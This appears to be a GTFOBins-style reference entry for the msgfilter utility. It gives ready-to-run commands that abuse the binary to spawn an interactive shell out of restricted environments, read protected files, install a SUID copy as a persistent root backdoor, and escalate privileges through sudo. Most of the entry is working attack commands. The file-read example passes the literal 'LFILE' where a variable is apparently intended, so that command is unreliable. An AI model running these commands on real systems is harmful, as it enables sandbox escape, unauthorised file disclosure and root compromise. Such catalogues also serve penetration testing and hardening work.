# GTFOBin: msgfilter

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.

```
echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data. `/bin/cat` can be replaced with any other filter program.

```
LFILE=file_to_read
msgfilter -P -i "LFILE" /bin/cat
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.

```
sudo install -m =xs $(which msgfilter) .

echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.

```
echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
```